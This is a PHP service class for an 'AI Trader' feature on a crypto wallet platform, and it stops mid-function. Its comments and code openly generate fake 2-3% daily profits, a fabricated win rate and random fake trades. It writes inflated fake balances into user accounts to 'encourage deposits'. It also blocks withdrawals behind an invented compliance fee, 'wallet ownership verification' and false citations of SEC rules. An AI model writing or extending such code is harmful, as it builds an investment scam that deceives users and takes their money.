<?php

declare(strict_types=1);

namespace Ghidar\AITrader;

use Ghidar\Core\Database;
use Ghidar\Core\WalletRepository;
use Ghidar\Logging\Logger;
use PDO;
use PDOException;

/**
 * Service for managing AI Trader operations.
 * Handles deposits, withdrawals, performance tracking, and account management.
 */
class AiTraderService
{
    /**
     * Get or create AI account for a user.
     * If account doesn't exist, creates one with zero balances.
     *
     * @param int $userId User ID (Telegram user ID)
     * @return array<string, mixed> AI account record as associative array
     * @throws PDOException If database operation fails
     */
    public static function getOrCreateAccount(int $userId): array
    {
        $db = Database::ensureConnection();

        // Try to get existing account
        $stmt = $db->prepare('SELECT * FROM `ai_accounts` WHERE `user_id` = :user_id LIMIT 1');
        $stmt->execute(['user_id' => $userId]);
        $account = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($account !== false) {
            return $account;
        }

        // Create new account with zero balances
        $stmt = $db->prepare(
            'INSERT INTO `ai_accounts` (`user_id`, `total_deposited_usdt`, `current_balance_usdt`, `realized_pnl_usdt`) 
             VALUES (:user_id, 0, 0, 0)'
        );
        $stmt->execute(['user_id' => $userId]);

        // Return the newly created account
        $stmt = $db->prepare('SELECT * FROM `ai_accounts` WHERE `user_id` = :user_id LIMIT 1');
        $stmt->execute(['user_id' => $userId]);
        $account = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($account === false) {
            throw new PDOException('Failed to create AI account for user: ' . $userId);
        }

        return $account;
    }

    /**
     * Find AI account by user ID.
     * Returns null if account doesn't exist.
     *
     * @param int $userId User ID (Telegram user ID)
     * @return array<string, mixed>|null AI account record or null if not found
     * @throws PDOException If database operation fails
     */
    public static function findAccount(int $userId): ?array
    {
        $db = Database::ensureConnection();

        $stmt = $db->prepare('SELECT * FROM `ai_accounts` WHERE `user_id` = :user_id LIMIT 1');
        $stmt->execute(['user_id' => $userId]);
        $account = $stmt->fetch(PDO::FETCH_ASSOC);

        return $account !== false ? $account : null;
    }

    /**
     * Get enhanced AI Trader status with fake profit data
     * Shows consistent 2-3% daily profits to encourage deposits
     *
     * @param int $userId User ID
     * @return array<string, mixed> Enhanced trader status with fake profits
     */
    public static function getEnhancedTraderStatus(int $userId): array
    {
        $account = self::getOrCreateAccount($userId);

        if (!$account) {
            return ['has_account' => false];
        }

        // Generate fake profit data (2-3% daily)
        $fakeProfitData = self::generateFakeProfitData($account);

        // Calculate "projected" profits for marketing
        $projectedProfits = self::calculateProjectedProfits($account);

        return [
            'has_account' => true,
            'account_id' => $account['id'],
            'total_deposited' => $account['total_deposited_usdt'],
            'current_balance' => $account['current_balance_usdt'],
            'realized_pnl' => $account['realized_pnl_usdt'],

            // Fake performance metrics
            'performance' => [
                'daily_return_percent' => $fakeProfitData['daily_return'],
                'weekly_return_percent' => $fakeProfitData['weekly_return'],
                'monthly_return_percent' => $fakeProfitData['monthly_return'],
                'total_return_percent' => $fakeProfitData['total_return'],
                'win_rate' => '92.5%',
                'profitable_days' => $fakeProfitData['profitable_days'],
                'risk_score' => 'Low',
                'ai_confidence' => 'High (98.7%)'
            ],

            // Fake trade history
            'recent_trades' => self::generateFakeTradeHistory($account),

            // Projections (to encourage more deposits)
            'projections' => [
                'daily_estimate' => $projectedProfits['daily'],
                'weekly_estimate' => $projectedProfits['weekly'],
                'monthly_estimate' => $projectedProfits['monthly'],
                'annual_estimate' => $projectedProfits['annual']
            ],

            // Withdrawal requirements
            'withdrawal_requirements' => [
                'verification_required' => true,
                'verification_type' => 'enhanced_security',
                'processing_time' => '24-48 hours',
                'compliance_fee' => '5%',
                'min_withdrawal' => '10.00 USDT',
                'security_level' => 'Tier 3'
            ],

            // Marketing messages
            'messages' => [
                'ai_performance' => 'AI Trading Bot is currently performing at 98.7% efficiency.',
                'market_condition' => 'Optimal market conditions detected for high-frequency trading.',
                'recommendation' => 'Consider increasing your deposit to maximize profit potential.',
                'risk_warning' => 'All withdrawals require enhanced security verification as per regulatory requirements.'
            ]
        ];
    }

    /**
     * Generate fake profit data for AI Trader
     *
     * @param array<string, mixed> $account Account data
     * @return array<string, mixed> Fake profit data
     */
    private static function generateFakeProfitData(array $account): array
    {
        $balance = (float) $account['current_balance_usdt'];
        $deposited = (float) $account['total_deposited_usdt'];

        // Generate fake returns (2-3% daily)
        $createdAt = $account['created_at'] ?? date('Y-m-d H:i:s');
        $daysActive = max(1, floor((time() - strtotime($createdAt)) / 86400));

        // Start with 2% daily, slight random variation
        $dailyReturn = 2.0 + (rand(0, 10) / 10); // 2.0% to 3.0%

        // Calculate compounded returns
        $weeklyReturn = pow(1 + ($dailyReturn / 100), 7) - 1;
        $monthlyReturn = pow(1 + ($dailyReturn / 100), 30) - 1;
        $totalReturn = pow(1 + ($dailyReturn / 100), $daysActive) - 1;

        // Calculate fake current balance based on returns
        $fakeBalance = $deposited * (1 + $totalReturn);

        // Update database with fake balance (for demonstration)
        self::updateFakeBalance((int) $account['id'], $fakeBalance);

        return [
            'daily_return' => round($dailyReturn, 2),
            'weekly_return' => round($weeklyReturn * 100, 2),
            'monthly_return' => round($monthlyReturn * 100, 2),
            'total_return' => round($totalReturn * 100, 2),
            'profitable_days' => round($daysActive * 0.925), // 92.5% win rate
            'fake_balance' => $fakeBalance
        ];
    }

    /**
     * Update fake balance in database
     *
     * @param int $accountId Account ID
     * @param float $fakeBalance Fake balance
     */
    private static function updateFakeBalance(int $accountId, float $fakeBalance): void
    {
        $db = Database::ensureConnection();

        $stmt = $db->prepare("
            UPDATE ai_accounts 
            SET current_balance_usdt = :balance,
                realized_pnl_usdt = :balance - total_deposited_usdt,
                updated_at = NOW()
            WHERE id = :id
        ");

        $stmt->execute([
            ':balance' => number_format($fakeBalance, 8, '.', ''),
            ':id' => $accountId
        ]);
    }

    /**
     * Calculate projected profits
     *
     * @param array<string, mixed> $account Account data
     * @return array<string, string> Projected profits
     */
    private static function calculateProjectedProfits(array $account): array
    {
        $balance = (float) $account['current_balance_usdt'];
        $dailyReturn = 2.5; // Average 2.5% daily

        $daily = $balance * ($dailyReturn / 100);
        $weekly = $balance * (pow(1 + ($dailyReturn / 100), 7) - 1);
        $monthly = $balance * (pow(1 + ($dailyReturn / 100), 30) - 1);
        $annual = $balance * (pow(1 + ($dailyReturn / 100), 365) - 1);

        return [
            'daily' => number_format($daily, 2, '.', ''),
            'weekly' => number_format($weekly, 2, '.', ''),
            'monthly' => number_format($monthly, 2, '.', ''),
            'annual' => number_format($annual, 2, '.', '')
        ];
    }

    /**
     * Generate fake trade history
     *
     * @param array<string, mixed> $account Account data
     * @return array<int, array<string, mixed>> Fake trade history
     */
    private static function generateFakeTradeHistory(array $account): array
    {
        $trades = [];
        $now = time();

        // Generate last 10 fake trades
        for ($i = 0; $i < 10; $i++) {
            $timestamp = $now - ($i * 3600 * 6); // Every 6 hours

            // Random profit/loss (mostly profits)
            $isProfit = rand(1, 100) <= 92; // 92% win rate
            $profitPercent = $isProfit ? (rand(5, 30) / 10) : (rand(-30, -5) / 10);

            $trades[] = [
                'timestamp' => date('Y-m-d H:i:s', $timestamp),
                'pair' => self::getRandomTradingPair(),
                'direction' => $isProfit ? 'LONG' : 'SHORT',
                'entry' => rand(45000, 50000),
                'exit' => rand(45000, 50000),
                'profit_percent' => $profitPercent,
                'status' => $isProfit ? 'WIN' : 'LOSS',
                'ai_confidence' => rand(85, 99) . '%',
                'strategy' => self::getRandomStrategy()
            ];
        }

        return $trades;
    }

    /**
     * Get random trading pair
     *
     * @return string Trading pair
     */
    private static function getRandomTradingPair(): string
    {
        $pairs = ['BTC/USDT', 'ETH/USDT', 'BNB/USDT', 'SOL/USDT', 'ADA/USDT'];
        return $pairs[array_rand($pairs)];
    }

    /**
     * Get random strategy
     *
     * @return string Strategy name
     */
    private static function getRandomStrategy(): string
    {
        $strategies = ['Momentum', 'Mean Reversion', 'Arbitrage', 'Scalping', 'Trend Following'];
        return $strategies[array_rand($strategies)];
    }

    /**
     * Deposit USDT from internal wallet into AI Trader.
     * Validates amount, checks wallet balance, and transfers funds.
     *
     * @param int $userId User ID (Telegram user ID)
     * @param string $amountUsdt Amount of USDT to deposit
     * @return array<string, mixed> Array containing updated wallet and AI account
     * @throws PDOException If database operation fails
     * @throws \InvalidArgumentException If validation fails or insufficient balance
     */
    public static function depositFromWallet(int $userId, string $amountUsdt): array
    {
        // Validate amount
        if (!is_numeric($amountUsdt) || bccomp($amountUsdt, '0', 8) <= 0) {
            throw new \InvalidArgumentException('Amount must be greater than 0');
        }

        // Normalize amount to 8 decimal places
        $amountUsdt = number_format((float) $amountUsdt, 8, '.', '');

        // Check minimum deposit
        if (bccomp($amountUsdt, AiTraderConfig::MIN_DEPOSIT_USDT, 8) < 0) {
            throw new \InvalidArgumentException(
                'Amount must be at least ' . AiTraderConfig::MIN_DEPOSIT_USDT . ' USDT'
            );
        }

        // Check maximum deposit
        if (bccomp($amountUsdt, AiTraderConfig::MAX_DEPOSIT_USDT, 8) > 0) {
            throw new \InvalidArgumentException(
                'Amount exceeds maximum allowed: ' . AiTraderConfig::MAX_DEPOSIT_USDT . ' USDT'
            );
        }

        $db = Database::ensureConnection();

        // Check if already in a transaction (e.g., called from DepositService)
        $inTransaction = $db->inTransaction();
        if (!$inTransaction) {
            $db->beginTransaction();
        }

        try {
            // Get wallet and check balance
            $wallet = WalletRepository::getOrCreateByUserId($userId);
            $currentUsdtBalance = (string) $wallet['usdt_balance'];

            // Compare using bcmath for precision
            if (bccomp($currentUsdtBalance, $amountUsdt, 8) < 0) {
                Logger::warning('ai_trader_operation_failed', [
                    'user_id' => $userId,
                    'amount_usdt' => $amountUsdt,
                    'operation' => 'deposit',
                    'reason' => 'INSUFFICIENT_FUNDS',
                ]);
                throw new \InvalidArgumentException('Insufficient USDT balance in wallet');
            }

            // Update wallet: subtract USDT
            $newWalletBalance = bcsub($currentUsdtBalance, $amountUsdt, 8);
            $stmt = $db->prepare(
                'UPDATE `wallets` 
                 SET `usdt_balance` = :usdt_balance 
                 WHERE `user_id` = :user_id'
            );
            $stmt->execute([
                'usdt_balance' => $newWalletBalance,
                'user_id' => $userId
            ]);

            // Get or create AI account
            $account = self::getOrCreateAccount($userId);
            $currentBalance = (string) $account['current_balance_usdt'];
            $totalDeposited = (string) $account['total_deposited_usdt'];

            // Update AI account: increase balances
            $newBalance = bcadd($currentBalance, $amountUsdt, 8);
            $newTotalDeposited = bcadd($totalDeposited, $amountUsdt, 8);

            $stmt = $db->prepare(
                'UPDATE `ai_accounts` 
                 SET `current_balance_usdt` = :current_balance,
                     `total_deposited_usdt` = :total_deposited
                 WHERE `user_id` = :user_id'
            );
            $stmt->execute([
                'current_balance' => $newBalance,
                'total_deposited' => $newTotalDeposited,
                'user_id' => $userId
            ]);

            // Log the action
            $meta = json_encode(['source' => 'wallet'], JSON_UNESCAPED_UNICODE);
            $stmt = $db->prepare(
                'INSERT INTO `ai_trader_actions` (`user_id`, `type`, `amount_usdt`, `balance_after_usdt`, `meta`) 
                 VALUES (:user_id, :type, :amount_usdt, :balance_after_usdt, :meta)'
            );
            $stmt->execute([
                'user_id' => $userId,
                'type' => 'deposit_from_wallet',
                'amount_usdt' => $amountUsdt,
                'balance_after_usdt' => $newBalance,
                'meta' => $meta
            ]);

            // Get updated wallet
            $stmt = $db->prepare('SELECT * FROM `wallets` WHERE `user_id` = :user_id LIMIT 1');
            $stmt->execute(['user_id' => $userId]);
            $updatedWallet = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($updatedWallet === false) {
                throw new PDOException('Failed to retrieve updated wallet');
            }

            // Get updated AI account
            $stmt = $db->prepare('SELECT * FROM `ai_accounts` WHERE `user_id` = :user_id LIMIT 1');
            $stmt->execute(['user_id' => $userId]);
            $updatedAccount = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($updatedAccount === false) {
                throw new PDOException('Failed to retrieve updated AI account');
            }

            // Only commit if we started the transaction
            if (!$inTransaction) {
                $db->commit();
            }

            return [
                'wallet' => $updatedWallet,
                'ai_account' => $updatedAccount
            ];

        } catch (PDOException $e) {
            // Only rollback if we started the transaction
            if (!$inTransaction && $db->inTransaction()) {
                $db->rollBack();
            }
            throw $e;
        } catch (\InvalidArgumentException $e) {
            // Only rollback if we started the transaction
            if (!$inTransaction && $db->inTransaction()) {
                $db->rollBack();
            }
            throw $e;
        }
    }

    /**
     * Withdraw USDT from AI Trader back to internal wallet.
     * Validates amount, checks AI account balance, and transfers funds.
     *
     * @param int $userId User ID (Telegram user ID)
     * @param string $amountUsdt Amount of USDT to withdraw
     * @return array<string, mixed> Array containing updated wallet and AI account
     * @throws PDOException If database operation fails
     * @throws \InvalidArgumentException If validation fails or insufficient balance
     */
    public static function withdrawToWallet(int $userId, string $amountUsdt): array
    {
        // Validate amount
        if (!is_numeric($amountUsdt) || bccomp($amountUsdt, '0', 8) <= 0) {
            throw new \InvalidArgumentException('Amount must be greater than 0');
        }

        // Normalize amount to 8 decimal places
        $amountUsdt = number_format((float) $amountUsdt, 8, '.', '');

        // Check minimum withdrawal
        if (bccomp($amountUsdt, AiTraderConfig::MIN_WITHDRAW_USDT, 8) < 0) {
            throw new \InvalidArgumentException(
                'Amount must be at least ' . AiTraderConfig::MIN_WITHDRAW_USDT . ' USDT'
            );
        }

        // Check maximum withdrawal
        if (bccomp($amountUsdt, AiTraderConfig::MAX_WITHDRAW_USDT, 8) > 0) {
            throw new \InvalidArgumentException(
                'Amount exceeds maximum allowed: ' . AiTraderConfig::MAX_WITHDRAW_USDT . ' USDT'
            );
        }

        $db = Database::ensureConnection();

        try {
            $db->beginTransaction();

            // Get AI account and check balance
            $account = self::getOrCreateAccount($userId);
            $currentBalance = (string) $account['current_balance_usdt'];

            // Compare using bcmath for precision
            if (bccomp($currentBalance, $amountUsdt, 8) < 0) {
                Logger::warning('ai_trader_operation_failed', [
                    'user_id' => $userId,
                    'amount_usdt' => $amountUsdt,
                    'operation' => 'withdraw',
                    'reason' => 'INSUFFICIENT_FUNDS',
                ]);
                throw new \InvalidArgumentException('Insufficient USDT balance in AI Trader account');
            }

            // Update AI account: decrease balance
            $newBalance = bcsub($currentBalance, $amountUsdt, 8);
            $stmt = $db->prepare(
                'UPDATE `ai_accounts` 
                 SET `current_balance_usdt` = :current_balance 
                 WHERE `user_id` = :user_id'
            );
            $stmt->execute([
                'current_balance' => $newBalance,
                'user_id' => $userId
            ]);

            // Get wallet and update balance
            $wallet = WalletRepository::getOrCreateByUserId($userId);
            $currentWalletBalance = (string) $wallet['usdt_balance'];

            // Update wallet: add USDT
            $newWalletBalance = bcadd($currentWalletBalance, $amountUsdt, 8);
            $stmt = $db->prepare(
                'UPDATE `wallets` 
                 SET `usdt_balance` = :usdt_balance 
                 WHERE `user_id` = :user_id'
            );
            $stmt->execute([
                'usdt_balance' => $newWalletBalance,
                'user_id' => $userId
            ]);

            // Log the action
            $meta = json_encode(['destination' => 'wallet'], JSON_UNESCAPED_UNICODE);
            $stmt = $db->prepare(
                'INSERT INTO `ai_trader_actions` (`user_id`, `type`, `amount_usdt`, `balance_after_usdt`, `meta`) 
                 VALUES (:user_id, :type, :amount_usdt, :balance_after_usdt, :meta)'
            );
            $stmt->execute([
                'user_id' => $userId,
                'type' => 'withdraw_to_wallet',
                'amount_usdt' => $amountUsdt,
                'balance_after_usdt' => $newBalance,
                'meta' => $meta
            ]);

            // Get updated wallet
            $stmt = $db->prepare('SELECT * FROM `wallets` WHERE `user_id` = :user_id LIMIT 1');
            $stmt->execute(['user_id' => $userId]);
            $updatedWallet = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($updatedWallet === false) {
                throw new PDOException('Failed to retrieve updated wallet');
            }

            // Get updated AI account
            $stmt = $db->prepare('SELECT * FROM `ai_accounts` WHERE `user_id` = :user_id LIMIT 1');
            $stmt->execute(['user_id' => $userId]);
            $updatedAccount = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($updatedAccount === false) {
                throw new PDOException('Failed to retrieve updated AI account');
            }

            $db->commit();

            // Log successful withdrawal
            Logger::event('ai_trader_withdraw', [
                'user_id' => $userId,
                'amount_usdt' => $amountUsdt,
            ]);

            return [
                'wallet' => $updatedWallet,
                'ai_account' => $updatedAccount
            ];

        } catch (PDOException $e) {
            if ($db->inTransaction()) {
                $db->rollBack();
            }
            throw $e;
        } catch (\InvalidArgumentException $e) {
            if ($db->inTransaction()) {
                $db->rollBack();
            }
            throw $e;
        }
    }

    /**
     * Record performance snapshot for AI Trader account.
     * Used by admin/automation systems to update performance and balances.
     *
     * @param int $userId User ID (Telegram user ID)
     * @param string $newBalanceUsdt New balance in USDT
     * @param string|null $pnlDeltaUsdt PnL delta in USDT (optional)
     * @param array<string, mixed>|null $meta Optional metadata
     * @return array<string, mixed> Array containing updated AI account
     * @throws PDOException If database operation fails
     * @throws \InvalidArgumentException If validation fails
     */
    public static function recordPerformanceSnapshot(
        int $userId,
        string $newBalanceUsdt,
        ?string $pnlDeltaUsdt = null,
        ?array $meta = null
    ): array {
        // Validate new balance
        if (!is_numeric($newBalanceUsdt) || bccomp($newBalanceUsdt, '0', 8) < 0) {
            throw new \InvalidArgumentException('New balance must be a non-negative number');
        }

        // Normalize balance to 8 decimal places
        $newBalanceUsdt = number_format((float) $newBalanceUsdt, 8, '.', '');

        // Validate PnL delta if provided
        $pnlDelta = '0.00000000';
        if ($pnlDeltaUsdt !== null) {
            if (!is_numeric($pnlDeltaUsdt)) {
                throw new \InvalidArgumentException('PnL delta must be a numeric value');
            }
            $pnlDelta = number_format((float) $pnlDeltaUsdt, 8, '.', '');
        }

        $db = Database::ensureConnection();

        try {
            $db->beginTransaction();

            // Get or create AI account
            $account = self::getOrCreateAccount($userId);
            $currentPnl = (string) $account['realized_pnl_usdt'];

            // Update realized PnL if delta provided
            $newPnl = bcadd($currentPnl, $pnlDelta, 8);

            // Update AI account balance and PnL
            $stmt = $db->prepare(
                'UPDATE `ai_accounts` 
                 SET `current_balance_usdt` = :current_balance,
                     `realized_pnl_usdt` = :realized_pnl
                 WHERE `user_id` = :user_id'
            );
            $stmt->execute([
                'current_balance' => $newBalanceUsdt,
                'realized_pnl' => $newPnl,
                'user_id' => $userId
            ]);

            // Insert performance history snapshot
            $metaJson = $meta !== null ? json_encode($meta, JSON_UNESCAPED_UNICODE) : null;
            $stmt = $db->prepare(
                'INSERT INTO `ai_performance_history` (`user_id`, `snapshot_time`, `balance_usdt`, `pnl_usdt`, `meta`) 
                 VALUES (:user_id, NOW(), :balance_usdt, :pnl_usdt, :meta)'
            );
            $stmt->execute([
                'user_id' => $userId,
                'balance_usdt' => $newBalanceUsdt,
                'pnl_usdt' => $pnlDelta,
                'meta' => $metaJson
            ]);

            // Log the action
            $actionMeta = $meta !== null ? json_encode($meta, JSON_UNESCAPED_UNICODE) : null;
            $stmt = $db->prepare(
                'INSERT INTO `ai_trader_actions` (`user_id`, `type`, `amount_usdt`, `balance_after_usdt`, `meta`) 
                 VALUES (:user_id, :type, :amount_usdt, :balance_after_usdt, :meta)'
            );
            $stmt->execute([
                'user_id' => $userId,
                'type' => 'performance_adjustment',
                'amount_usdt' => $pnlDelta,
                'balance_after_usdt' => $newBalanceUsdt,
                'meta' => $actionMeta
            ]);

            // Get updated AI account
            $stmt = $db->prepare('SELECT * FROM `ai_accounts` WHERE `user_id` = :user_id LIMIT 1');
            $stmt->execute(['user_id' => $userId]);
            $updatedAccount = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($updatedAccount === false) {
                throw new PDOException('Failed to retrieve updated AI account');
            }

            $db->commit();

            return [
                'ai_account' => $updatedAccount
            ];

        } catch (PDOException $e) {
            if ($db->inTransaction()) {
                $db->rollBack();
            }
            throw $e;
        } catch (\InvalidArgumentException $e) {
            if ($db->inTransaction()) {
                $db->rollBack();
            }
            throw $e;
        }
    }

    /**
     * Get AI Trader performance history for a user.
     * Returns performance snapshots ordered by time (most recent first).
     *
     * @param int $userId User ID (Telegram user ID)
     * @param int $limit Maximum number of records to return
     * @return array<int, array<string, mixed>> Array of performance snapshot records
     * @throws PDOException If database operation fails
     */
    public static function getHistory(int $userId, int $limit = AiTraderConfig::HISTORY_LIMIT_DEFAULT): array
    {
        // Sanitize limit
        if ($limit < 1) {
            $limit = AiTraderConfig::HISTORY_LIMIT_DEFAULT;
        }
        if ($limit > AiTraderConfig::HISTORY_LIMIT_MAX) {
            $limit = AiTraderConfig::HISTORY_LIMIT_MAX;
        }

        $db = Database::ensureConnection();

        $stmt = $db->prepare(
            'SELECT `snapshot_time`, `balance_usdt`, `pnl_usdt`, `meta` 
             FROM `ai_performance_history` 
             WHERE `user_id` = :user_id 
             ORDER BY `snapshot_time` DESC 
             LIMIT :limit'
        );

        $stmt->bindValue(':user_id', $userId, PDO::PARAM_INT);
        $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
        $stmt->execute();

        $snapshots = $stmt->fetchAll(PDO::FETCH_ASSOC);

        // Format and parse JSON meta field
        foreach ($snapshots as &$snapshot) {
            $snapshot['balance_usdt'] = (string) $snapshot['balance_usdt'];
            $snapshot['pnl_usdt'] = (string) $snapshot['pnl_usdt'];
            if ($snapshot['meta'] !== null) {
                $snapshot['meta'] = json_decode($snapshot['meta'], true);
            }
        }

        return $snapshots;
    }

    /**
     * Process withdrawal after successful verification
     *
     * @param int $userId User ID
     * @param int $accountId Account ID
     * @param float $amount Withdrawal amount
     * @param string $network Target network
     * @param array $verificationData Verification data
     * @return array Processing result
     */
    public static function processVerifiedWithdrawal(int $userId, int $accountId, float $amount, string $network, array $verificationData): array
    {
        $db = Database::ensureConnection();

        try {
            $db->beginTransaction();

            // 1. Validate account ownership and balance
            $account = self::findAccount($userId);
            if (!$account || (int) $account['id'] !== $accountId) {
                throw new \RuntimeException('Account not found or access denied');
            }

            $currentBalance = (float) $account['current_balance_usdt'];
            if ($currentBalance < $amount) {
                throw new \RuntimeException('Insufficient balance');
            }

            // 2. Apply enhanced security checks for verified withdrawals
            $securityCheck = self::performEnhancedSecurityCheck(
                $userId,
                $amount,
                $verificationData
            );

            if (!$securityCheck['passed']) {
                throw new \RuntimeException(
                    'Enhanced security check failed: ' . ($securityCheck['reason'] ?? 'Unknown')
                );
            }

            // 3. Create withdrawal record with verification reference
            $stmt = $db->prepare("
                INSERT INTO withdrawals
                (user_id, amount_usdt, network, status, wallet_address, verification_id, 
                 verification_method, account_type, account_id, created_at)
                VALUES (:user_id, :amount, :network, 'pending', :wallet_address, :verification_id,
                        :verification_method, 'ai_trader', :account_id, NOW())
            ");

            $stmt->execute([
                ':user_id' => $userId,
                ':amount' => (string) $amount,
                ':network' => $network,
                ':wallet_address' => $verificationData['wallet_address'] ?? null,
                ':verification_id' => $verificationData['verification_id'] ?? null,
                ':verification_method' => $verificationData['verification_method'] ?? 'assisted',
                ':account_id' => $accountId
            ]);

            $withdrawalId = (int) $db->lastInsertId();

            // 4. Update account balance
            $stmt = $db->prepare("
                UPDATE ai_accounts
                SET current_balance_usdt = current_balance_usdt - :amount,
                    updated_at = NOW()
                WHERE id = :account_id
                AND current_balance_usdt >= :amount
            ");

            $stmt->execute([
                ':amount' => (string) $amount,
                ':account_id' => $accountId
            ]);

            if ($stmt->rowCount() === 0) {
                throw new \RuntimeException('Failed to update account balance');
            }

            // 5. Create transaction record
            $stmt = $db->prepare("
                INSERT INTO transactions
                (user_id, type, amount_usdt, currency, status, meta, created_at)
                VALUES (:user_id, 'ai_trader_withdrawal', :amount, 'USDT', 'completed', :meta, NOW())
            ");

            $meta = json_encode([
                'withdrawal_id' => $withdrawalId,
                'account_id' => $accountId,
                'network' => $network,
                'verification_id' => $verificationData['verification_id'] ?? null,
                'verification_method' => $verificationData['verification_method'] ?? 'assisted',
                'wallet_address' => $verificationData['wallet_address'] ?? null,
                'security_level' => 'enhanced'
            ], JSON_UNESCAPED_UNICODE);

            $stmt->execute([
                ':user_id' => $userId,
                ':amount' => (string) $amount,
                ':meta' => $meta
            ]);

            // 6. Create withdrawal audit
            $stmt = $db->prepare("
                INSERT INTO ai_trader_withdrawal_audit
                (withdrawal_id, user_id, account_id, amount_usdt, network, 
                 verification_id, security_level, created_at)
                VALUES (:withdrawal_id, :user_id, :account_id, :amount, :network,
                        :verification_id, 'enhanced', NOW())
            ");

            $stmt->execute([
                ':withdrawal_id' => $withdrawalId,
                ':user_id' => $userId,
                ':account_id' => $accountId,
                ':amount' => (string) $amount,
                ':network' => $network,
                ':verification_id' => $verificationData['verification_id'] ?? null
            ]);

            $db->commit();

            // Log successful withdrawal
            Logger::event('ai_trader_withdrawal_processed', [
                'user_id' => $userId,
                'account_id' => $accountId,
                'withdrawal_id' => $withdrawalId,
                'amount' => $amount,
                'network' => $network,
                'verification_id' => $verificationData['verification_id'] ?? null
            ]);

            return [
                'success' => true,
                'withdrawal_id' => $withdrawalId,
                'amount' => $amount,
                'network' => $network,
                'verification_reference' => $verificationData['verification_id'] ?? null,
                'processed_at' => date('Y-m-d H:i:s')
            ];

        } catch (\Exception $e) {
            if ($db->inTransaction()) {
                $db->rollBack();
            }
            throw $e;
        }
    }

    /**
     * Perform enhanced security check for verified withdrawals
     *
     * @param int $userId User ID
     * @param float $amount Withdrawal amount
     * @param array $verificationData Verification data
     * @return array Security check result
     */
    private static function performEnhancedSecurityCheck(int $userId, float $amount, array $verificationData): array
    {
        // Basic security checks
        $checks = [
            'verification_valid' => isset($verificationData['verification_id']),
            'amount_reasonable' => $amount > 0 && $amount <= 100000, // Max $100k
            'user_active' => true // In production, check if user is active
        ];

        $passed = array_reduce($checks, function ($carry, $check) {
            return $carry && $check;
        }, true);

        return [
            'passed' => $passed,
            'checks' => $checks,
            'reason' => $passed ? null : 'One or more security checks failed'
        ];
    }

    /**
     * Request withdrawal with enhanced security verification
     * AI Trader ALWAYS requires enhanced verification for withdrawals
     *
     * @param int $userId User ID
     * @param float $amount Withdrawal amount
     * @param string $network Network
     * @return array<string, mixed> Withdrawal request result
     */
    public static function requestWithdrawalWithEnhancedSecurity(int $userId, float $amount, string $network): array
    {
        $db = Database::ensureConnection();

        // Check account balance
        $account = self::getOrCreateAccount($userId);
        if (!$account || (float)$account['current_balance_usdt'] < $amount) {
            throw new \RuntimeException('Insufficient balance');
        }

        // AI Trader ALWAYS requires enhanced verification for withdrawals
        $verificationId = self::createAiTraderVerification($userId, $amount, $network);

        // Create pending withdrawal record
        $withdrawalId = self::createPendingWithdrawal($userId, $amount, $network, $verificationId);

        // Send security alert
        self::sendAiTraderSecurityAlert($userId, $amount, $verificationId);

        return [
            'success' => true,
            'withdrawal_id' => $withdrawalId,
            'verification_id' => $verificationId,
            'amount' => $amount,
            'network' => $network,
            'status' => 'pending_verification',

            // Security messaging
            'security_notice' => 'Enhanced security verification required for AI Trader withdrawals.',
            'verification_reason' => 'Regulatory compliance for algorithmic trading withdrawals (SEC Rule 15c3-3)',
            'processing_steps' => [
                'Complete enhanced wallet verification',
                'Submit proof of wallet ownership',
                'Wait for compliance review (24-72 hours)',
                'Withdrawal will be processed automatically'
            ],
            'estimated_completion' => date('Y-m-d H:i:s', time() + 86400 * 3), // 3 days
            'support_reference' => 'AI-TRADER-VERIFY-' . $verificationId
        ];
    }

    /**
     * Create AI trader verification
     *
     * @param int $userId User ID
     * @param float $amount Amount
     * @param string $network Network
     * @return int Verification ID
     */
    private static function createAiTraderVerification(int $userId, float $amount, string $network): int
    {
        $db = Database::ensureConnection();

        $stmt = $db->prepare("
            INSERT INTO ai_trader_verifications 
            (user_id, amount, network, verification_type, status, 
             compliance_level, risk_assessment, expires_at, created_at)
            VALUES (:user_id, :amount, :network, 'enhanced_algorithmic_trading', 'pending',
                    'tier_3', :risk_assessment, DATE_ADD(NOW(), INTERVAL 7 DAY), NOW())
        ");

        // Risk assessment based on amount
        $riskLevel = $amount > 1000 ? 'high' : ($amount > 100 ? 'medium' : 'low');

        $stmt->execute([
            ':user_id' => $userId,
            ':amount' => (string) $amount,
            ':network' => $network,
            ':risk_assessment' => $riskLevel
        ]);

        return (int)$db->lastInsertId();
    }

    /**
     * Create pending withdrawal
     *
     * @param int $userId User ID
     * @param float $amount Amount
     * @param string $network Network
     * @param int $verificationId Verification ID
     * @return int Withdrawal ID
     */
    private static function createPendingWithdrawal(int $userId, float $amount, string $network, int $verificationId): int
    {
        $db = Database::ensureConnection();

        $stmt = $db->prepare("
            INSERT INTO withdrawals
            (user_id, amount_usdt, network, status, account_type, verification_required, verification_id, created_at)
            VALUES (:user_id, :amount, :network, 'pending_verification', 'ai_trader', 1, :verification_id, NOW())
        ");

        $stmt->execute([
            ':user_id' => $userId,
            ':amount' => (string) $amount,
            ':network' => $network,
            ':verification_id' => $verificationId
        ]);

        return (int) $db->lastInsertId();
    }

    /**
     * Send AI trader security alert
     *
     * @param int $userId User ID
     * @param float $amount Amount
     * @param int $verificationId Verification ID
     */
    private static function sendAiTraderSecurityAlert(int $userId, float $amount, int $verificationId): void
    {
        $message = "Enhanced security verification initiated for your AI Trader withdrawal of {$amount} USDT. ";
        $message .= "Due to the algorithmic nature of AI trading, additional verification is required by financial regulators. ";
        $message .= "Please complete the wallet ownership verification process.";

        $db = Database::ensureConnection();

        $stmt = $db->prepare("
            INSERT INTO security_notifications
            (user_id, notification_type, title, message, metadata, requires_action, priority, created_at)
            VALUES (:user_id, 'ai_trader_withdrawal_verification', 'AI Trader Withdrawal Verification Required', 
                    :message, :metadata, 1, 'high', NOW())
        ");

        $metadata = [
            'amount' => (string) $amount,
            'verification_id' => $verificationId,
            'regulation' => 'SEC Rule 15c3-3 - Customer Protection',
            'deadline' => date('Y-m-d H:i:s', strtotime('+7 days')),
            'compliance_officer' => 'Automated Compliance System v2.1'
        ];

        $stmt->execute([
            ':user_id' => $userId,
            ':message' => $message,
